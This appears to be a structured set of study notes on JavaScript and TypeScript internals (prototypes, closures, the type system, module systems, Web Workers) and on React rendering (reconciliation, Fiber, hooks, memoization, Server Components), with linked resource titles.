topics.title: JavaScript & TypeScript deeply
body: Prototypes and the `[[Prototype]]` chain, **closures** (and the `let` vs `var` loop bug), event-loop internals (`queueMicrotask`, `requestAnimationFrame`), and **TypeScript** in depth: generics, conditional/mapped types, template literal types, `infer`. Plus module systems (ESM vs CJS, tree shaking) and Web Workers/SharedArrayBuffer.
TS's type system is genuinely a small functional language - and it's applied type theory.

subtopics.title: Prototypes, the [[Prototype]] chain, and class syntax desugaring
body: JavaScript has **prototype-based inheritance**, not class-based inheritance. The ES6 `class` keyword is syntactic sugar - the runtime mechanism is still prototypes, and understanding what the sugar compiles to is what makes the behavior predictable. Every object in JS has an internal `[[Prototype]]` slot (accessible as `__proto__` or via `Object.getPrototypeOf()`). When you access a property on an object, the engine first checks the object's own properties, then walks up the `[[Prototype]]` chain until it finds the property or reaches `null` (the end of `Object.prototype`'s chain). This walk is synchronous and happens for every property access on every object.

**Constructor functions** are regular functions called with `new`. `new Foo()` does: (1) creates a plain object, (2) sets its `[[Prototype]]` to `Foo.prototype`, (3) calls `Foo` with `this` bound to the new object, (4) returns the object (unless `Foo` explicitly returns a different object). `Foo.prototype` is a regular object (not `Foo` itself) with a `constructor` property pointing back to `Foo`. Methods placed on `Foo.prototype` are shared across all instances - they live in one place in memory, not copied per instance. Instance-specific data (fields) goes on `this` inside the constructor.

ES6 `class` desugars to this pattern: `class Animal { constructor(name) { this.name = name; } speak() { ... } }` is equivalent to `function Animal(name) { this.name = name; } Animal.prototype.speak = function() { ... }`. `class Dog extends Animal` desugars to setting `Dog.prototype = Object.create(Animal.prototype)` and then `super(...)` inside the constructor calling `Animal.call(this, ...)`. The `super` keyword in methods uses `[[HomeObject]]`, an internal slot set at class definition time to allow `super.method()` to correctly resolve up the prototype chain of the *defining class*, not the instance's current prototype.

**Object.create(proto)** creates an object with `[[Prototype]]` set to `proto` without calling any constructor. `Object.create(null)` creates a **truly empty object** with no prototype at all - no `toString`, no `hasOwnProperty`, nothing. This is useful for creating pure dictionary objects without prototype pollution risk. `Object.assign(target, ...sources)` copies own enumerable properties (does not copy inherited properties, not a deep clone). The spread operator `{...obj}` does the same and creates a new object. Neither performs deep cloning - nested objects are still references.

A key practical nuance: **prototype mutation at runtime** affects all current and future instances. If you do `Array.prototype.myMethod = function() {}`, every array in the program suddenly has `myMethod`. This is prototype pollution if done to built-in prototypes - the reason libraries like MooTools broke web pages when browsers added built-in methods with the same name. **Property descriptors** (`Object.defineProperty`) control whether properties are `writable`, `enumerable`, and `configurable`. Object.prototype properties are all non-enumerable (they don't show in `for...in` loops). Sealing (`Object.seal`) prevents adding/removing properties; freezing (`Object.freeze`) also prevents modification - but both are shallow: nested objects remain mutable.

resources.label: MDN - Inheritance and the prototype chain

subtopics.title: Closures, lexical scoping, and the var/let/const distinction
body: A **closure** is a function bundled with its lexical environment - the set of variable bindings that were in scope where the function was *defined*, not where it is *called*. This is called **lexical (static) scoping**, as opposed to dynamic scoping. JS always uses lexical scoping. When the JS engine creates a function object, it captures a reference to the current scope chain (the **outer environment reference**), not a copy of the variable values. Closing over a variable means the closure holds a live reference to that binding.

The classic `var` loop bug: `for (var i = 0; i < 3; i++) { setTimeout(() => console.log(i), 0); }` prints `3 3 3`, not `0 1 2`. Because `var` is function-scoped (or global-scoped), there is only one `i` variable for all iterations. By the time the `setTimeout` callbacks run, the loop has finished and `i === 3`. All three closures reference the same `i`. The `let` fix: `for (let i = 0; i < 3; i++) { ... }` - `let` is block-scoped and the `for` loop creates a new binding per iteration, so each callback closes over a distinct `i` with a distinct value. The pre-`let` fix was an IIFE: `(function(i) { setTimeout(() => console.log(i), 0); })(i)` - passing `i` as an argument creates a new binding in each IIFE invocation.

**`var`** is function-scoped and hoisted (declaration hoisted to the top of the enclosing function, initialization stays in place - so `var x` above its assignment reads `undefined`, not a ReferenceError). **`let`** and **`const`** are block-scoped and are in a **Temporal Dead Zone (TDZ)** from the start of the block to the declaration - accessing them before the declaration is a `ReferenceError`, not `undefined`. This makes the behavior predictable at the cost of the 'use before declare' pattern that `var` allowed. `const` means the binding cannot be reassigned, not that the value is immutable - `const arr = []; arr.push(1)` is fine; `arr = []` is not.

**Closure memory implications**: because closures hold references to their enclosing scope, they prevent garbage collection of those scope variables as long as the closure is reachable. A classic memory leak: attaching an event listener (a closure) to a DOM element inside a component, and then removing the DOM element from the document without removing the event listener. The listener closure keeps the entire component scope chain alive. The fix: always remove event listeners (or use `AbortController` signals with `addEventListener`) when the element is removed. React's `useEffect` cleanup function exists for exactly this reason.

**Immediately Invoked Function Expressions (IIFEs)** `(function() { ... })()` were the pre-module pattern for creating a private scope. All module-like code before CommonJS/ESM used IIFEs to avoid polluting the global scope. Understanding them is necessary for reading older codebases and for understanding how module bundlers worked pre-natively (they wrapped each module in an IIFE). The **module pattern** used a closure to simulate private state: the IIFE returned an object with methods that closed over private variables, a primitive form of encapsulation.

subtopics.title: TypeScript's type system: generics, conditional types, and mapped types
body: TypeScript's type system is **Turing-complete** and behaves like a functional programming language operating at compile time. Types are values in this meta-language: you can write functions (generic type aliases), conditional expressions (conditional types), pattern matching (infer), and recursive types. Understanding it at this level transforms TS from 'JS with annotations' into a tool for encoding correctness invariants that the compiler enforces at zero runtime cost.

**Generics** are type parameters that make types polymorphic. `function identity<T>(x: T): T { return x; }` - `T` is resolved to the actual type at each call site, either by inference or explicit annotation. Generic constraints (`<T extends SomeType>`) restrict what types are acceptable. The common misunderstanding: `<T extends object>` does not mean 'T is exactly object' - it means 'T must be assignable to object', so any non-primitive passes. For 'T must have at least a `name` property', use `<T extends { name: string }>`. **Conditional types** (`T extends U ? X : Y`) are the type-level ternary: 'if T is assignable to U, resolve to X, otherwise Y'. They are evaluated distributively over union types by default: `type ToArray<T> = T extends any ? T[] : never` applied to `string | number` yields `string[] | number[]`, not `(string | number)[]`.

**`infer`** is the pattern-matching keyword in conditional types. `type ReturnType<T> = T extends (...args: any[]) => infer R ? R : never` - 'if T is a function type, capture the return type as R and return R'. The `infer` keyword introduces a type variable that is bound within the true branch of the conditional. This is used to extract: return types (`ReturnType<F>`), parameter types (`Parameters<F>`), the element type of an array (`T extends (infer Item)[] ? Item : never`), and the resolved type of a Promise (`Awaited<T>`). Composing `infer` with recursive conditional types lets you write non-trivial type-level algorithms like `DeepReadonly<T>` or tuple manipulation.

**Mapped types** transform one type into another by iterating over its keys. `type Readonly<T> = { readonly [K in keyof T]: T[K] }` - for every key `K` in `T`, produce a readonly property of the same type. You can modify keys with `as` clauses (key remapping): `type Getters<T> = { [K in keyof T as `get${Capitalize<string & K>}`]: () => T[K] }` produces a type where every property is replaced with a getter method. **Template literal types** compose string types: `type EventName<T extends string> = `on${Capitalize<T>}`; type ClickEvent = EventName<'click'>` yields `'onClick'`. These can be used as keys in mapped types to generate typed event handler signatures.

**Discriminated unions** are the pragmatic workaround for the lack of algebraic data types. `type Shape = { kind: 'circle', radius: number } | { kind: 'square', side: number }` - the `kind` discriminant lets TypeScript narrow the type inside a `switch(shape.kind)` statement to the correct variant. **`never`** is the bottom type: a function that always throws has return type `never`, a `switch` case that cannot be reached can use `const _exhaustive: never = value` to ensure the compiler catches unhandled variants as the union grows. This pattern is the typed analogue of ML/Haskell's pattern matching exhaustiveness checks.

**Declaration files (`.d.ts`)** describe the types of existing JS code without implementation. `DefinitelyTyped` (`@types/*`) is the community-maintained repository of type declarations for JS libraries that do not ship their own. Understanding how to read and write declaration files (module augmentation, ambient declarations, overloads) is necessary for working with legacy codebases and for publishing typed libraries. **`satisfies`** (TS 4.9) is the operator that validates an expression against a type without widening - `const config = { port: 8080 } satisfies ServerConfig` keeps `config.port` as the literal type `8080` while checking that the structure matches `ServerConfig`.

resources.label: Type Challenges - practice the type system

subtopics.title: Module systems: ESM vs CommonJS, bundlers, and tree shaking
body: JavaScript lacked a built-in module system until ES2015. Before that, the ecosystem used ad-hoc solutions: **IIFE** (browser, global scope partitioning), **AMD** (Asynchronous Module Definition - `define()`, used by RequireJS for async browser loading), and **CommonJS** (`require()`/`module.exports`, designed for Node.js's synchronous file system). The coexistence of these systems is why tooling (bundlers, transpilers) is so central to JS development.

**CommonJS (CJS)** is synchronous: `require('./module')` executes the file immediately and returns `module.exports`. This works in Node.js because files are local (fast disk), but cannot work natively in browsers (network I/O is async). CJS modules are **dynamic** - you can call `require()` inside conditionals and loops: `const mod = require(someVariable)`. This makes **static analysis impossible** - a bundler cannot know at build time which modules will be required. CJS modules also have a **circular dependency** problem: if A requires B and B requires A, whichever is required second gets a partially-constructed `module.exports` from the first.

**ES Modules (ESM)** are static: `import`/`export` declarations are parsed before any code executes, module URLs are resolved at parse time, and the module graph is fully constructed before any module's code runs. This **static structure** is what enables **tree shaking**: a bundler can determine at build time exactly which exports from each module are actually used anywhere in the application, and eliminate the unused ones. A function exported from a utility module but never imported by any consumer is simply removed from the bundle. This is why 'ES module' is synonymous with 'treeshakeable' in the bundler ecosystem. Named exports (as opposed to `export default {}`) are particularly amenable to tree shaking because individual exports can be eliminated.

**Bundlers** (Webpack, Rollup, esbuild, Vite/Rolldown) perform several jobs: module graph traversal (follow all imports from the entry point), dead code elimination (tree shaking), **code splitting** (divide the bundle into chunks loaded on demand), **minification** (remove whitespace, shorten names, fold constants), and often **transpilation** (run Babel/SWC to convert modern JS/TS to older syntax). **esbuild** rewrote the rules by implementing a bundler in Go: it is 10-100x faster than JS-based bundlers, which matters because HMR (Hot Module Replacement) speed directly affects developer experience. **Vite** uses esbuild for development (unbundled native ESM with fast individual module transforms) and Rollup/Rolldown for production (full bundle optimization).

**Dual ESM/CJS packages** are the source of the most confusing Node.js errors. When a library ships both `require()` and `import` entry points (via the `exports` field in `package.json`), a consumer might end up with two instances of the library if some code path uses CJS and another uses ESM - breaking singletons, instanceof checks, and WeakMap lookups. The Node.js `--conditions` flag and the `exports` field's `import`/`require` conditions are the resolution mechanism, but the interaction with bundlers (which handle `exports` differently) creates subtle bugs. **`.mjs`** files are always treated as ESM; **`.cjs`** files are always treated as CommonJS; **`.js`** files use the `type` field in `package.json` (`module` for ESM, default `commonjs`).

resources.label: Vite - Why Vite (ESM dev server motivation)

subtopics.title: Web Workers, SharedArrayBuffer, and parallelism on the web
body: The browser's single-threaded JS model means any heavy computation on the main thread blocks rendering - the UI freezes. **Web Workers** run JavaScript in separate OS threads, with their own V8 isolate, call stack, and event loop. They cannot access the DOM (there is no DOM in a Worker's global scope), and they communicate with the main thread via `postMessage()`. By default, messages are **structured-cloned** - deep-copied using the Structured Clone Algorithm (which handles more types than JSON.stringify, including `Map`, `Set`, `Date`, `Blob`, `ArrayBuffer`, circular references, but not functions or DOM nodes).

**Transferable objects** avoid copying large buffers. `postMessage(buffer, [buffer])` transfers ownership of `buffer` to the recipient - the sender's reference becomes neutered (accessing it throws). This is zero-copy: the OS-level page table mappings are updated rather than bytes being copied. `ArrayBuffer`, `MessagePort`, `OffscreenCanvas`, and `ImageBitmap` are transferable. This is the correct pattern for sending large audio/video frames or ML inference tensors between threads without serialization overhead.

**`SharedArrayBuffer`** takes parallelism further: a shared block of memory that both the main thread and one or more Workers can access simultaneously without message passing. This unlocks true shared-memory concurrency in the browser. The catch: this also enables **Spectre-class side-channel attacks** (timer-based cache side channels measuring how fast shared memory operations complete). After Spectre was disclosed in 2018, browsers disabled `SharedArrayBuffer` globally. It was re-enabled in 2020 only for pages with **cross-origin isolation**: the server must send `Cross-Origin-Opener-Policy: same-origin` and `Cross-Origin-Embedder-Policy: require-corp` headers, which prevent the page from being embedded in an attacker-controlled frame and restrict which cross-origin resources can be loaded.

**Atomics** are the synchronization primitive for `SharedArrayBuffer`. `Atomics.add(typedArray, index, value)` performs a test-and-set that is guaranteed to be atomic - no other thread can observe a half-written value. `Atomics.wait(typedArray, index, expectedValue)` puts the current thread to sleep until the value changes (like a mutex condition variable), and `Atomics.notify(typedArray, index, count)` wakes waiting threads. This is the WebAssembly `wait`/`notify` instruction set mapped to JS. Used correctly, you can implement mutexes, semaphores, and lock-free data structures in JS - the same patterns from low-level systems programming, running in a browser.

**Practical patterns**: use a Worker for CPU-bound tasks (image processing, crypto, code compilation in browser IDEs, ML inference via ONNX Runtime Web). Use `OffscreenCanvas` to render WebGL in a Worker without blocking the main thread. Use `SharedArrayBuffer` + `Atomics` for producer-consumer scenarios (e.g., an audio worklet filling a ring buffer that the main thread reads). **Comlink** (by Surma) wraps the Worker `postMessage` API in a Proxy that makes calling Worker methods feel like calling async functions - the most ergonomic Worker API available without a framework.

resources.label: Comlink - Web Worker library (Google Chrome Labs)

topics.title: React internals & rendering
body: The rendering model: reconciliation, **fiber architecture**, lanes/priority, when components re-render and how to stop them (`memo`/`useMemo`/`useCallback` - when they help vs hurt), the `useEffect` model, concurrent features (`useTransition`, Suspense), and **Server Components** (zero-JS components, streaming).
Knowing *why* React re-renders is what turns 'it's slow and I don't know why' into deliberate optimization.

subtopics.title: Reconciliation and the virtual DOM
body: React's core insight is the **rendering model**: instead of imperatively updating the DOM when state changes, you describe what the UI *should look like* given current state, and React figures out the minimal DOM mutations needed to get there. This description is a **virtual DOM** - a tree of plain JavaScript objects (React elements) that mirror the structure of the actual DOM. `<div className='foo'>` in JSX compiles to `React.createElement('div', { className: 'foo' })`, which returns `{ type: 'div', props: { className: 'foo', children: [...] } }`. These objects are cheap to create; the expensive part is DOM mutation.

**Reconciliation** is the algorithm that compares the new virtual DOM tree against the previous one (**diffing**) and computes the minimal set of DOM operations. React uses a heuristic O(n) algorithm (vs the theoretical O(n^3) for general tree edit distance): (1) if two elements have different `type`s, tear down the old tree entirely and build the new one (including resetting all state) - this is why conditionally rendering `<A />` vs `<B />` at the same position always unmounts the previous; (2) for elements of the same type, update only the changed props and recurse into children; (3) for lists, use **keys** to identify which items moved, were added, or were removed. Keys must be stable, unique among siblings, and not index-based if the list order can change - using index as key causes subtle state bugs when items are reordered or deleted.

The **key** attribute is the most commonly misunderstood React feature. It tells the reconciler whether an element is the *same logical item* as in the previous render. When keys are stable, React reuses the existing DOM node and component instance (preserving state). When keys change, React unmounts the old instance and mounts a new one (resetting state). This can be used intentionally: `<ExpensiveComponent key={userId} />` - changing `userId` forces a remount, clearing all internal state without writing a `useEffect` cleanup. Accidental key changes (e.g., generating random keys on every render) cause catastrophic performance: every render remounts all keyed components.

**Rendering vs committing**: React's work is split into two phases. The **render phase** (also called the reconciliation phase) is pure and side-effect-free: React calls your component functions to get their React element output, diffs against the previous tree, and builds a **work-in-progress tree** with the computed changes. This phase can be interrupted, resumed, or restarted (this is the basis for concurrent features). The **commit phase** is synchronous and cannot be interrupted: React applies the computed DOM mutations, runs `useLayoutEffect` cleanup and setup, then asynchronously runs `useEffect` cleanup and setup. Mutations only happen in commit; render phase is read-only. This is why you should never produce side effects during render (component function body) - they may run multiple times.

React 18's **automatic batching** groups multiple state updates from the same event handler, timeout, or Promise into a single re-render. Before React 18, batching only worked inside React synthetic event handlers - calling `setState` in a `setTimeout` triggered a separate render per call. After React 18, all updates are batched by default. To opt out (rarely needed): `ReactDOM.flushSync(() => setState(...))` forces a synchronous, unbatched update. This change can cause subtle bugs in code that relied on state updates from async contexts being applied immediately.

resources.label: Build Your Own React - Rodrigo Pombo

subtopics.title: Fiber architecture: the concurrent rendering foundation
body: React Fiber (shipped in React 16) was a complete rewrite of the reconciler. The motivation: the original recursive reconciler was a single synchronous traversal of the entire component tree. It could not be interrupted mid-way. If reconciling a large tree took 100ms, the browser was blocked for 100ms - no input handling, no painting, no animations. On a 60fps display, each frame is 16.67ms; a 100ms block drops ~6 frames.

**Fiber** replaces the recursive call stack with an explicit **linked list of fiber nodes** - one per component instance. Each fiber holds: the component type, its props, its state, a reference to its real DOM node, and links to its parent, first child, sibling, and the alternate fiber (the work-in-progress counterpart). This linked list structure lets React save its position in the traversal, yield control back to the browser, and resume later - the same work that was a function call stack is now an iterative traversal of a data structure.

React controls when it yields via the **scheduler** (a separate package). The scheduler has a priority system with five levels: **Immediate** (synchronous, `flushSync`), **User-Blocking** (input events, transitions with `useTransition`), **Normal** (default, `setState` calls), **Low** (analytics, prefetching), and **Idle** (background work). Each unit of work (processing one fiber) checks a deadline: if the remaining time in the current frame is below a threshold (typically 5ms), it yields and the scheduler picks it back up in the next frame via `MessageChannel` (not `requestAnimationFrame` - the scheduler uses `MessageChannel` for its own queue to avoid the rendering pipeline's overhead).

**Lanes** (introduced in React 17, replacing the priority queue) are a bitmask-based priority system. A lane is a bit position in a 31-bit integer. Each update is tagged with a lane. When React needs to batch or defer work, it can pick which lanes to process in a given render pass. This enables **concurrent features**: an update tagged with `TransitionLane` can be interrupted by a more urgent update in `SyncLane`, the urgent update commits first, and the interrupted transition is restarted with the latest state. The bitmask allows O(1) lane operations (bitwise AND to check if lanes intersect, bitwise OR to merge lanes).

**`useTransition`** and **`startTransition`** mark state updates as non-urgent transitions. Wrapping `setState` in `startTransition` tells React it can be interrupted: if the user types again before the transition finishes, React discards the in-progress render and starts fresh. The `isPending` flag from `useTransition` lets you show a loading indicator while the transition is computing. The canonical use case: a search input where filtering a large list is expensive. Without transitions: every keystroke blocks until the list re-renders. With transitions: input updates synchronously (stays responsive), list update is a deferred transition (can be interrupted by the next keystroke).

**`Suspense`** and **Error Boundaries** integrate with Fiber's error and loading state propagation. When a component in the tree throws a Promise (via `use(promise)` or React Query's internals), Fiber catches it, walks up the fiber tree to find the nearest `<Suspense>` boundary, and renders that boundary's `fallback` while the promise is pending. When the promise resolves, React retries the render of the suspended subtree. Error boundaries catch synchronous errors thrown during render and display an error UI instead of crashing the entire app. Both mechanisms work because Fiber owns the traversal and can catch mid-render throws.

resources.label: React - Concurrent UI Patterns (legacy docs, still accurate)

subtopics.title: Hooks internals: useState, useEffect, and the rules of hooks
body: Hooks are implemented as a **linked list of hook state nodes** stored on the fiber. When React calls your component function, it sets a global dispatcher. Each `useState()`, `useEffect()`, `useRef()` call reads from or writes to the *current position* in the hook list on the current fiber. Position is tracked by a cursor that increments with each hook call. This is the mechanism behind the **Rules of Hooks**: you must call hooks at the top level (never inside conditionals, loops, or nested functions) because the position in the list must be the same across every render for each hook to read its own state.

**`useState`** stores `[state, setState]` in a hook node. `setState(newValue)` enqueues an update on the fiber and schedules a re-render. Multiple `setState` calls in the same event handler are batched (React 18). `setState` with a function (`setState(prev => prev + 1)`) is the correct form when the new state depends on the previous - the functional update is guaranteed to see the latest state even if batched with other updates. The state is *not* updated immediately - `state` still holds the old value for the rest of the current render. Reading state after calling `setState` reads the current render's value, not the next render's value.

**`useEffect`** runs *after* the commit phase, asynchronously (after paint). Its cleanup runs before the next effect and on unmount. The dependency array controls when the effect re-runs: no array means every render, empty array means once on mount, non-empty array means when any dependency changes (shallow `Object.is` comparison). The canonical mistake: putting an object or function in the dependency array that is created fresh on every render - the effect re-runs every render because `Object.is({}, {}) === false`. The fix: memoize the dependency or use the primitive value instead of the object.

**`useLayoutEffect`** runs synchronously after DOM mutations but before paint - equivalent to componentDidMount/componentDidUpdate in class components. Use it when you need to read layout (e.g., `getBoundingClientRect()`) and immediately mutate DOM to avoid a flash: read the old size, state-update the new size, all before the user sees the intermediate state. The cost: it blocks paint, so it must be fast. **`useRef`** returns a mutable `{ current: value }` container that persists across renders without causing re-renders. Used for: DOM element references, storing the previous render's values, storing mutable values that should not trigger re-renders (timers, subscriptions, the latest value of a prop without re-running an effect).

The **stale closure** problem is the most common `useEffect` bug. An effect closes over a value from the render in which it was created. If the effect captures a callback or variable and then runs after a re-render where that value changed, it sees the old (stale) value. The `useCallback` + dependency array solution often leads to more stale closures. The idiomatic React 18 fix: `useRef` to store the latest version of the callback, and call `ref.current()` from a stable effect. This is the pattern `useEvent` (an upcoming React hook) will formalize: a stable function reference that always reads the latest state.

resources.label: Dan Abramov - A Complete Guide to useEffect

subtopics.title: Memoization: React.memo, useMemo, useCallback - when they help vs hurt
body: Memoization in React means 'skip re-rendering (or re-computing) if inputs have not changed'. It is an optimization, not a correctness guarantee, and it has real costs: memory (to store the cached result), CPU (to run the comparison on every render), and code complexity. The rule: **profile first, memoize second**. Memoizing unconditionally is a form of premature optimization that often makes performance worse.

**`React.memo(Component)`** wraps a component and skips re-rendering if props have not changed (shallow comparison via `Object.is`). The common misuse: wrapping a component that re-renders rarely anyway (memoization adds overhead without benefit), or wrapping a component whose parent always passes new object/function references (the memoization never saves a render because the comparison always fails). `React.memo` is effective when: the component renders often, re-renders are expensive (large lists, complex UI), and its props are stable between parent re-renders.

**`useMemo(fn, deps)`** memoizes the *result* of a computation. It re-runs `fn` only when dependencies change. Effective for: expensive computations (parsing a large dataset, sorting a list, running a regex over a large string). Not effective for: primitive values (the computation is cheaper than the memoization overhead), JSX (`useMemo(() => <Component />, [])` is wrong - wrapping JSX in `useMemo` does not prevent the component from re-rendering; `React.memo` does that). **`useCallback(fn, deps)`** is `useMemo(() => fn, deps)` - it memoizes the function reference itself. Its only useful purpose is stabilizing a callback reference when that callback is passed as a prop to a `React.memo`'d child or used as a dependency in another hook.

The **re-render cascade** is the root cause of most React performance problems. A parent re-renders, all its children re-render (by default), all their children re-render, and so on. For large trees, this is expensive. The solutions in order of preference: (1) **lift state down** - move state closer to where it is used so fewer components are in the re-render subtree; (2) **component composition** - pass children as props so they do not re-render with their parent (`{props.children}` comes from outside, does not re-render when the layout component does); (3) **React.memo** - opt individual components out of re-renders when inputs are stable; (4) **useMemo/useCallback** - stabilize specific prop references that would otherwise break React.memo comparisons. This ordering is important: architectural changes (1, 2) are free and often more impactful than memoization (3, 4).

**React Compiler** (formerly React Forget, shipping experimentally in React 19) automatically inserts memoization at the component and hook level by analyzing the data flow of your component. If the compiler can prove that a value is stable, it wraps it in the equivalent of `useMemo`/`useCallback` automatically. The goal: write idiomatic React code without thinking about memoization, and get optimal re-render behavior for free. This changes the calculus: if you are on React 19+ with the compiler enabled, manual memoization becomes counterproductive (the compiler already handled it, and adding manual memo wrapping may confuse the compiler's analysis).

resources.label: React - Skipping expensive recalculations with useMemo

subtopics.title: Server Components, streaming, and the modern React architecture
body: **React Server Components (RSC)** run *only* on the server - never on the client. They have direct access to databases, file systems, and backend services. They produce a special wire format (not HTML, not JSON - a React-specific serialization of the component tree) that is sent to the client. The client's React runtime reconstructs the component tree from this format. Crucially, Server Components produce **zero JavaScript** that ships to the client - they render on the server and their code is never downloaded by the browser.

The RSC model changes the data-fetching story fundamentally. Instead of: render a loading skeleton → fetch data from the client → render the real content (two round trips, a spinner, and complexity in state management), you: fetch data on the server during the render → send the already-populated UI to the client (one round trip, no spinner, no client-side state for the fetched data). RSC uses `async/await` in component bodies directly: `async function ProductPage({ id }) { const product = await db.products.find(id); return
{product.name}
; }` - the component is async, the data is fetched during render, and the result ships to the client as rendered output.

**Client Components** (the traditional React components, marked with `'use client'`) are the boundary: they run on both server (for HTML prerendering) and client (for interactivity). Server Components can import and render Client Components; Client Components cannot import Server Components (because SC code must not reach the client). However, Server Components can be *passed as children* to Client Components - this is the key pattern for composing the two: a Server Component fetches data and renders a Client Component wrapper, passing the data-populated Server Component subtree as children.

**Streaming** (via React 18's `renderToPipeableStream`/`renderToReadableStream` and HTTP `Transfer-Encoding: chunked`) means the server does not wait for the entire React tree to be ready before sending the first bytes. Instead, it streams HTML in chunks as components resolve. `<Suspense>` boundaries control this: the outer shell renders and streams immediately; each Suspense boundary's fallback is sent first, and the resolved content is streamed later as a small `<script>` that tells React where in the DOM to insert it. The user sees content progressively instead of waiting for the slowest data fetch.

**Next.js App Router** is the canonical RSC implementation. Its conventions: `page.tsx` in a directory is a Server Component that gets URL params as props; `'use client'` marks Client Components; `layout.tsx` wraps nested routes (persists across navigations); `loading.tsx` is an automatic Suspense fallback; `error.tsx` is an automatic Error Boundary. Server Actions (`'use server'` functions) are the mechanism for form submissions and mutations - they run on the server in response to user interactions, letting you call the database from what looks like a form `action` function. This closes the loop: data reads (RSC), streaming (Suspense), and mutations (Server Actions) all without a separate API layer for simple cases.

resources.label: Josh Comeau - Making Sense of React Server Components
Build your own React - Rodrigo Pombo
